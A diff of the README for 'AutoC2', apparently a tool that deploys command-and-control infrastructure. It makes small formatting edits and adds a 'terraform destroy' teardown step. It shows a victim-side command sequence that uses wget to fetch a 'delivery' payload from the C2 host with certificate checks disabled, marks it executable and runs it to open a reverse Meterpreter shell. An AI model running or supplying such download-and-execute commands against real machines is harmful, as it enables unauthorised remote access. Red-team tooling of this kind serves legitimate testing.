@@ -3,7 +3,7 @@
 
 A quick isolated C2 Deployer.
 
-![GitHub Logo](/demo_screenshots/AutoC2_1.PNG)
+![AutoC2](/demo_screenshots/AutoC2_1.PNG)
 
 
 ## Overview
@@ -90,10 +90,16 @@ sudo docker container exec -it msf /bin/bash
 
 *  By default docker_delivery.rc uses certificate picked up automatically by metasploit.
 
-*On a **victim box**, execute the following to get reverse meterpreter shell.
+* On a **victim box**, execute the following to get reverse meterpreter shell.
 
 ```bash
 wget --no-check-certificate https://c2IP/delivery
 chmod +x delivery
 ./delivery&
 ```
+* Finally to destroy the infrastructure completely(use this with caution!) use the following command :
+```bash
+terraform destroy
+```
+
+
